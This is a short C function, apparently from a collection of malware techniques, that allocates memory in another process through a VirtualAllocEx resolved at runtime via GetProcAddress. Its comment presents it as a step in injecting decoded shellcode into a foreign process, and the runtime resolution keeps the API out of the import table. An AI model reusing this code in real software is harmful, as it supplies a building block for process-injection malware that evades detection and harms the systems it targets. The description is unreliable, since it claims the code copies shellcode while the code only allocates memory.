// Description: Copy decoded shellcode to memoty of foregn process using dynamicly resolved VirtualAllocEx API
// Used WinAPIs: GetProcAddress, GetModuleHandle, GetLastError
// IOCS strings:
LPVOID AllocMemory(HANDLE process, SIZE_T size) {
	typedef LPVOID (WINAPI * VirtualAllocEx_) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	VirtualAllocEx_ _VirtualAllocEx = (VirtualAllocEx_)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAllocEx");

	LPVOID result = _VirtualAllocEx(process, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	#ifdef DEBUG
		if (result == NULL) {
			printf("[-] _VirtualAllocEx failed (%d)\n", GetLastError());
		}
	#endif
	return result;
}
